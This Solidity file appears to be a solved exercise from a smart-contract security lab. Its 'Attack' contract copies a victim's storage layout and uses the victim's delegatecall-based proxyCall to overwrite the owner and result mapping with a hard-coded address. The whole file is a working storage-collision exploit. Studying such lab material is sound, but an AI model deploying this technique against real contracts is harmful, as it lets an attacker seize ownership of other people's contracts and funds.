// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}


contract Attack {
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract

    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;
    address internal immutable victim;

    constructor(address addr) payable {
        victim = addr;
    }

    function changeResult(address owner2) external {
        owner = owner2;
        result[owner2] = true;
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSignature("changeResult(address)",address(0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE));

        ID31eg4t3(victim).proxyCall(data);
        // (abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
        
    }

}
